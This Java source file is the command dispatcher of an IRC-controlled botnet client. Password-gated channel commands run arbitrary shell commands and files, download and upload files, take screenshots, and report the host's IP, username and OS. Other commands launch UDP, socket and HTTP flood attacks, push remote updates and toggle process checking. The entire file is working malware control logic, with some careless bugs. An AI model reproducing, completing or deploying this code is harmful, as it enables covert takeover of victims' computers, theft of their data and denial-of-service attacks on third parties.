import java.io.IOException;

/**
 * CommandProcess class, processes all the commands
 * @author Nathan
 *
 */

public class CommandProcess
{
	/**
	 * Constructor
	 */
	public CommandProcess()
	{
	}
	
	/**
	 * Reads the command and then check weather or not is is a valid command
	 * If there is a valid command it executes the code inside the if block
	 * @param message
	 */
	public static void processCommand(String message)
	{
		try {
		String args[] = Misc.splitArgs(message);
		String cmd = args[0];
		if(!cmd.startsWith("$")) {
			return;
		}
		for(int i = 0; i < args.length; i++) {
			if(args[i].contains("$home")) {
			args[i].replaceAll("$home", System.getProperty("user.home"));
			}
		}
		if (cmd.startsWith("$unlock"))
		{
			if (directCmdTo != null) if (directCmdTo.equals(Config.getNick()))
			{
				if (args[1].equals(Config.getControlPassword()))
				{
					setCommandsUnlocked(true);
					IRC.sendMessage(Config.getChannel(), "Commands are now unlocked!");
				}
				else
				{
					IRC.sendMessage(Config.getChannel(), "Incorrect password, commands were not unlocked!");
				}
				return;
			}
			if (args[1].equals(Config.getControlPassword()))
			{
				setCommandsUnlocked(true);
				IRC.sendMessage(Config.getChannel(), "Commands are now unlocked!");
			}
			else
			{
				IRC.sendMessage(Config.getChannel(), "Incorrect password, commands were not unlocked!");
			}
		}
		if (getCommandsUnlocked())
		{
			if (cmd.startsWith("$lock"))
			{
				if (directCmdTo != null) if (directCmdTo.equals(Config.getNick()))
				{
					if (args[1].equals(Config.getControlPassword()))
					{
						setCommandsUnlocked(false);
						IRC.sendMessage(Config.getChannel(), "Commands are now locked!");
					}
					else
					{
						IRC.sendMessage(Config.getChannel(), "Incorrect password, commands were not locked!");
					}
				}
				else
				{
					return;
				}
				if (args[1].equals(Config.getControlPassword()))
				{
					setCommandsUnlocked(false);
					IRC.sendMessage(Config.getChannel(), "Commands are now locked!");
				}
				else
				{
					IRC.sendMessage(Config.getChannel(), "Incorrect password, commands were not locked!");
				}
			}
			if (cmd.equalsIgnoreCase("$getip"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Hi there, my IP is ")).append(Misc.getIPAddress("http://whatismyip.com/automation/n09230945.asp")).toString());
					return;
				}
				if (directCmdTo == null)
				{
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Hi there, my IP is ")).append(Misc.getIPAddress("http://whatismyip.com/automation/n09230945.asp")).toString());
				}
			}
			if (cmd.equalsIgnoreCase("$getUsername"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("My username is ")).append(Misc.getUsername()).toString());
					return;
				}
				if (directCmdTo == null)
				{
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("My username is ")).append(Misc.getUsername()).toString());
				}
			}
			if (cmd.startsWith("$sendMessage"))
			{
				ShowMessage showMess;
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					showMess = new ShowMessage(args[1]);
					showMess.start();
					return;
				}
				if (directCmdTo == null)
				{
					showMess = new ShowMessage(args[1]);
					showMess.start();
				}
			}
			if (cmd.startsWith("$execute"))
			{
				String execute;
				FileExecute exeC;
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					execute = cmd.substring(9);
					execute.replace("$getUserHome", System.getProperty("user.home"));
					exeC = new FileExecute(execute);
					exeC.start();
					return;
				}
				if (directCmdTo == null)
				{
					execute = cmd.substring(9);
					execute.replace("$getUserHome", System.getProperty("user.home"));
					exeC = new FileExecute(execute);
					exeC.start();
				}
			}
			if (cmd.startsWith("$shellcommand"))
			{
				String command;
				CommandExecute cmdE;
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					command = cmd.substring(14);
					cmdE = new CommandExecute(command);
					cmdE.start();
					return;
				}
				if (directCmdTo == null)
				{
					command = cmd.substring(14);
					cmdE = new CommandExecute(command);
					cmdE.start();
				}
			}
			if (cmd.startsWith("$download"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					try
					{
						args[2].replace("$getUserHome", System.getProperty("user.home"));
						Downloader down = new Downloader(args[1], args[2], Integer.parseInt(args[3]));
						down.start();
						IRC.sendMessage(Config.getChannel(), (new StringBuilder("Attepmting to download ")).append(args[1]).append(" to ").append(args[2]).toString());
					}
					catch (Exception e)
					{
						Misc.print((new StringBuilder("Failed to download ")).append(args[1]).toString());
					}
					return;
				}
				if (directCmdTo == null)
				{
					try
					{
						args[2].replace("$getUserHome", System.getProperty("user.home"));
						Downloader down = new Downloader(args[1], args[2], Integer.parseInt(args[3]));
						down.start();
						IRC.sendMessage(Config.getChannel(), (new StringBuilder("Attepmting to download ")).append(args[1]).append(" to ").append(args[2]).toString());
					}
					catch (Exception e)
					{
						Misc.print((new StringBuilder("Failed to download ")).append(args[1]).toString());
					}
				}
			}
			if (cmd.equals("$commandList"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					IRC.sendMessage(Config.getChannel(), "$unlock PASSHERE, $lock PASSHERE, $getip, $getUsername, $sendMessage, $execute FILEPATHANDNAME, $shellcommand COMMANDHERE, $close");
					return;
				}
				if (directCmdTo == null)
				{
					IRC.sendMessage(Config.getChannel(), "$unlock PASSHERE, $lock PASSHERE, $getip, $getUsername, $sendMessage, $execute FILEPATHANDNAME, $shellcommand COMMANDHERE, $close");
				}
			}
			if (cmd.startsWith("$directCommandTo"))
			{
				directCmdTo = args[1];
				IRC.sendMessage(Config.getChannel(), (new StringBuilder("Directing commands to ")).append(args[1]).toString());
			}
			if (cmd.equals("$resetDirect"))
			{
				IRC.sendMessage(Config.getChannel(), "Not directing commands to individuals!");
				directCmdTo = null;
			}
			if (cmd.startsWith("$setNick"))
			{
				String oldNick = Config.getNick();
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
						Config.setNick(args[1]);
						IRC.nick(args[1]);
						IRC.sendMessage(Config.getChannel(), (new StringBuilder("My nick was changed from ")).append(oldNick).append(" to ").append(args[1]).toString());
					}
			if(directCmdTo == null)
				{
					IRC.sendMessage(Config.getChannel(), "Cannot change all to the same nick, you must direct the command at a specific client!");
				}
			}
			if (cmd.startsWith("$setSuffix"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Config.setSuffix(args[1]);
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Suffix set to ")).append(args[1]).toString());
					IRC.nick(Config.getNick());
					return;
				}
				if (directCmdTo == null)
				{
					Config.setSuffix(args[1]);
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Suffix set to ")).append(args[1]).toString());
					IRC.nick(Config.getNick());
				}
			}
			if (cmd.startsWith("$setPrefix"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Config.setPrefix(args[1]);
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Prefix set to ")).append(args[1]).toString());
					IRC.nick(Config.getNick());
					return;
				}
				if (directCmdTo == null)
				{
					Config.setPrefix(args[1]);
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Prefix set to ")).append(args[1]).toString());
					IRC.nick(Config.getNick());
				}
			}
			if (cmd.startsWith("$sockFlood"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					SocketFlooder sock = new SocketFlooder(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]), Integer.parseInt(args[4]));
					sock.start();
					IRC.sendMessage(Config.getChannel(), "Socket flooding started type $stopSockFlood to stop");
					return;
				}
				if (directCmdTo == null)
				{
					SocketFlooder sock = new SocketFlooder(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]), Integer.parseInt(args[4]));
					sock.start();
					IRC.sendMessage(Config.getChannel(), "Socket flooding started type $stopSockFlood to stop");
				}
			}
			if (cmd.equals("stopSockFlood"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					SocketFlooder.flooding = false;
					IRC.sendMessage(Config.getChannel(), "Trying to stop socket flooding!");
					return;
				}
				if (directCmdTo == null)
				{
					SocketFlooder.flooding = false;
					IRC.sendMessage(Config.getChannel(), "Trying to stop socket flooding!");
				}
			}
			if (cmd.startsWith("$udpFlood"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					try {
					UDPFlood udp = new UDPFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
					udp.start();
					UDPFlood.udpFlooding = true;
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("UDP Flooding started to ")).append(args[1]).toString());
					return;
					}  catch (Exception e) {
						
					}
				}
				if (directCmdTo == null)
				{
					try {
					UDPFlood udp = new UDPFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
					udp.start();
					UDPFlood.udpFlooding = true;
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("UDP Flooding started to ")).append(args[1]).toString());
					} catch (Exception e) {
						
					}
				}
			}
			if (cmd.startsWith("$stopUdp"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					UDPFlood.udpFlooding = false;
					IRC.sendMessage(Config.getChannel(), "UDP Flooding stopped!");
					return;
				}
				if (directCmdTo == null)
				{
					UDPFlood.udpFlooding = false;
					IRC.sendMessage(Config.getChannel(), "UDP Flooding stopped!");
				}
			}
			if (cmd.startsWith("$takeScreenshot"))
			{
				Screenshot screen;
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					args[2].replace("$getUserHome", System.getProperty("user.home"));
					screen = new Screenshot(Integer.parseInt(args[1]), args[2]);
					screen.start();
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Taking screenshot after ")).append(args[1]).append(" and ").append("saving to ").append(args[2]).toString());
					return;
				}
				if (directCmdTo == null)
				{
					args[2].replace("$getUserHome", System.getProperty("user.home"));
					screen = new Screenshot(Integer.parseInt(args[1]), args[2]);
					screen.start();
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("Taking screenshot after ")).append(args[1]).append(" and ").append("saving to ").append(args[2]).toString());
				}
			}
			if (cmd.equals("$getHomeDir"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("My home dir is ")).append(System.getProperty("user.home")).toString());
					return;
				}
				if (directCmdTo == null)
				{
					IRC.sendMessage(Config.getChannel(), (new StringBuilder("My home dir is ")).append(System.getProperty("user.home")).toString());
				}
			}
			if(cmd.equals("$getOS")) {
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					IRC.sendMessage(Config.getChannel(), "My OS is " +System.getProperty("os.name"));
					return;
				}
				if(directCmdTo == null) {
					IRC.sendMessage(Config.getChannel(), "My OS is " +System.getProperty("os.name"));
				}
			}
			if (cmd.equals("$mkshell"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (shell == null)
					{
						IRC ir = new IRC();
						new Shell(ir, Config.getChannel());
						IRC.sendMessage(Config.getChannel(), "Created new shell for channel " + Config.getChannel() + " successfully.");
					}
					else
					{
						IRC.sendMessage(Config.getChannel(), "Shell already exists for this channel.");
					}
					return;
				}
				if (directCmdTo == null)
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (shell == null)
					{
						IRC ir = new IRC();
						new Shell(ir, Config.getChannel());
						IRC.sendMessage(Config.getChannel(), "Created new shell for channel " + Config.getChannel() + " successfully.");
					}
					else
					{
						IRC.sendMessage(Config.getChannel(), "Shell already exists for this channel.");
					}
				}
			}
			if (cmd.equals("$mkdir"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (args.length == 2)
					{
						if (shell == null)
						{
							IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
						}
						else
						{
							shell.mkdir(args[1]);
						}
					}
					return;
				}
				if (directCmdTo == null)
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (args.length == 2)
					{
						if (shell == null)
						{
							IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
						}
						else
						{
							shell.mkdir(args[1]);
						}
					}
				}
			}
			if (cmd.equals("$cd"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (args.length == 2)
					{
						if (shell == null)
						{
							IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
						}
						else
						{
							shell.cd(args[1]);
						}
					}
					return;
				}
				if (directCmdTo == null)
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (args.length == 2)
					{
						if (shell == null)
						{
							IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
						}
						else
						{
							shell.cd(args[1]);
						}
					}
				}
			}
			if (cmd.equals("$ls"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (shell == null)
					{
						IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
					}
					else
					{
						shell.ls();
					}
					return;
				}
				if (directCmdTo == null)
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (shell == null)
					{
						IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
					}
					else
					{
						shell.ls();
					}
				}
			}
			if (cmd.equals("$shellExec"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (args.length < 1)
					{
						IRC.sendMessage(Config.getChannel(), "Please fill in required fields");
					}
					if (shell != null)
					{
						FileExecute exec = new FileExecute(Shell.getCurrentDir() + "//" + args[1]);
						exec.start();
						IRC.sendMessage(Config.getChannel(), "Executing " + Shell.getCurrentDir() + "//" + args[1]);
					}
					else
					{
						IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
					}
					return;
				}
				if (directCmdTo == null)
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (args.length < 1)
					{
						IRC.sendMessage(Config.getChannel(), "Please fill in required fields");
					}
					if (shell != null)
					{
						FileExecute exec = new FileExecute(Shell.getCurrentDir() + "//" + args[1]);
						exec.start();
						IRC.sendMessage(Config.getChannel(), "Executing " + Shell.getCurrentDir() + "//" + args[1]);
					}
					else
					{
						IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
					}
				}
			}
			if (cmd.equals("$rootDir"))
			{
				Shell shell = Shell.getShell(Config.getChannel());
				if (shell == null)
				{
					IRC.sendMessage(Config.getChannel(), "Shell not created for this channel");
				}
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Shell.setCurrentDir("C://");
					IRC.sendMessage(Config.getChannel(), "Dir set to " + Shell.getCurrentDir());
					return;
				}
				if (directCmdTo == null)
				{
					Shell.setCurrentDir("C://");
					IRC.sendMessage(Config.getChannel(), "Dir set to " + Shell.getCurrentDir());
				}
			}
			if (cmd.equals("$getLocation"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (shell != null)
					{
						IRC.sendMessage(Config.getChannel(), "My current location is " + Shell.getCurrentDir());
					}
					else
					{
						IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
					}
					return;
				}
				if (directCmdTo == null)
				{
					Shell shell = Shell.getShell(Config.getChannel());
					if (shell != null)
					{
						IRC.sendMessage(Config.getChannel(), "My current location is " + Shell.getCurrentDir());
					}
					else
					{
						IRC.sendMessage(Config.getChannel(), "No shell found for this channel.");
					}
				}
			}
			if (cmd.equals("$update"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					Update update = new Update(args[1], Integer.parseInt(args[2]), args[3], args[4]);
					IRC.sendMessage(Config.getChannel(), "Update Details: URL = " + args[1] + " " + "Restart = " + args[2] + " LocalName = " + args[3] + " Old File Name = " + args[4]);
					update.start();
					IRC.sendMessage(Config.getChannel(), "Update started!");
					return;
				}
				if (directCmdTo == null)
				{
					Update update = new Update(args[1], Integer.parseInt(args[2]), args[3], args[4]);
					IRC.sendMessage(Config.getChannel(), "Update Details: URL = " + args[1] + " " + "Restart = " + args[2] + " LocalName = " + args[3] + " Old File Name = " + args[4]);
					update.start();
					IRC.sendMessage(Config.getChannel(), "Update started!");
				}
			}
			if(cmd.equals("$httpf")) {
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					HTTPFlood flood = new HTTPFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
					flood.start();
					IRC.sendMessage(Config.getChannel(), "Http flood started!");
					return;
				}
				if(directCmdTo == null) {
					HTTPFlood flood = new HTTPFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
					flood.start();
					IRC.sendMessage(Config.getChannel(), "Http flood started!");
				}
			}
			if(cmd.equals("$stopFloods")) {
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					if(UDPFlood.udpFlooding) {
						UDPFlood.udpFlooding = false;
					}
					if(SocketFlooder.flooding) {
						SocketFlooder.flooding = false;
					}
					if(HTTPFlood.httpFlooding) {
						HTTPFlood.httpFlooding = false;
					}
				IRC.sendMessage(Config.getChannel(), "All flooding stopped");
				return;
				}
				if(directCmdTo == null) {
					if(UDPFlood.udpFlooding) {
						UDPFlood.udpFlooding = false;
					}
					if(SocketFlooder.flooding) {
						SocketFlooder.flooding = false;
					}
					if(HTTPFlood.httpFlooding) {
						HTTPFlood.httpFlooding = false;
					}
					IRC.sendMessage(Config.getChannel(), "All flooding stopped");
				}
			}
			if (cmd.equals("$processList"))
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					ProcessList list = new ProcessList();
					list.start();
					return;
				}
				if (directCmdTo == null)
				{
					ProcessList list = new ProcessList();
					list.start();
				}
			}
			if(cmd.equals("$sendFile")) 
			{
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
				FileSend file = new FileSend(args[1], Integer.parseInt(args[2]), args[3]);
				file.start();
				return;
				}
				if(directCmdTo == null) {
					FileSend file = new FileSend(args[1], Integer.parseInt(args[2]), args[3]);
					file.start();
				}
			}
			if(cmd.equals("$uploadFile")) {
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					FileUploader file = new FileUploader(args[1], args[2], Integer.parseInt(args[3]));
					file.start();
					return;
				}
				if(directCmdTo == null) {
					FileUploader file = new FileUploader(args[1], args[2], Integer.parseInt(args[3]));
					file.start();
				}
			}
			if(cmd.equals("$disableProcessChecking")) {
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
				ProcessChecker.processCheckingEnabled = false;
				IRC.sendMessage(Config.getChannel(), "Process checking disabled!");
				return;
				}
				if(directCmdTo == null) {
					ProcessChecker.processCheckingEnabled = false;
					IRC.sendMessage(Config.getChannel(), "Process checking disabled!");
				}
			}
			if(cmd.equals("$enableProcessChecking")) {
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
				ProcessChecker.processCheckingEnabled = false;
				IRC.sendMessage(Config.getChannel(), "Process checking enabled!");
				return;
				}
				if(directCmdTo == null) {
					ProcessChecker.processCheckingEnabled = false;
					IRC.sendMessage(Config.getChannel(), "Process checking enabled!");
				}
			}
			if (cmd.equals("$close"))
			{
				if (directCmdTo != null) if (directCmdTo.equals(Config.getNick()))
				{
					IRC.sendMessage(Config.getChannel(), "Closing socket, disconnected!");
					try
					{
						Config.setIsClosing(true);
						Main.mainSock.close();
						System.exit(0);
					}
					catch (IOException e)
					{
						e.printStackTrace();
					}
					Main.mainSock = null;
				}
				else
				{
					return;
				}
				IRC.sendMessage(Config.getChannel(), "Closing socket, disconnected!");
				try
				{
					Config.setIsClosing(true);
					Main.mainSock.close();
					System.exit(0);
				}
				catch (IOException e)
				{
					e.printStackTrace();
				}
				Main.mainSock = null;
			}
		}
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	/**
	 * Sets if the commands are locked or unlocked
	 * @param lock
	 */
	public static void setCommandsUnlocked(boolean lock)
	{
		commandsUnlocked = lock;
	}
	/**
	 * Gets if the commands are unlocked or not
	 * @return
	 */
	public static boolean getCommandsUnlocked()
	{
		return commandsUnlocked;
	}
	public static boolean commandsUnlocked = false;
	public static String directCmdTo = null;
}